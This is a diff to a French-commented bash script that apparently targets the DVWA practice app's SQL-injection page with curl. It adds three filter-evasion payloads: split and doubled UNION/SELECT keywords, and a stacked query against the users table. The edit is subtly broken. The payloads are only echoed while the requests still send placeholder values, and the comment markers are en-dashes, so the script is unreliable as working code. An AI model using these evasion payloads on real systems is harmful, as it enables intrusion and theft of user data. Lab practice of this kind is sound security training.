@@ -24,21 +24,21 @@ echo "[*] Cookie recupere"
 echo ""
 
 # ── Payload 1 — REMPLACEZ PAR VOTRE ATTAQUE ────────────────────────────────
-echo "[1] Payload basique..."
+echo "/?id=1/union/union/select/select+1,2,3/*"
 RESULT=$(curl -s -b "$COOKIE_FILE" \
   "http://$TARGET:$PORT/vulnerabilities/sqli/?id=TEST1&Submit=Submit" \
   -o /dev/null -w "%{http_code}")
 echo "    HTTP $RESULT"
 
 # ── Payload 2 ───────────────────────────────────────────────────────────────
-echo "[2] Payload avance..."
+echo "1+un//ion+sel//ect+1,2,3–"
 RESULT2=$(curl -s -b "$COOKIE_FILE" \
   "http://$TARGET:$PORT/vulnerabilities/sqli/?id=TEST2&Submit=Submit" \
   -o /dev/null -w "%{http_code}")
 echo "    HTTP $RESULT2"
 
 # ── Payload 3 ───────────────────────────────────────────────────────────────
-echo "[3] Payload evasion..."
+echo "1;select+1&id=2,3+from+users+where+id=1–"
 # A completer
 
 echo ""
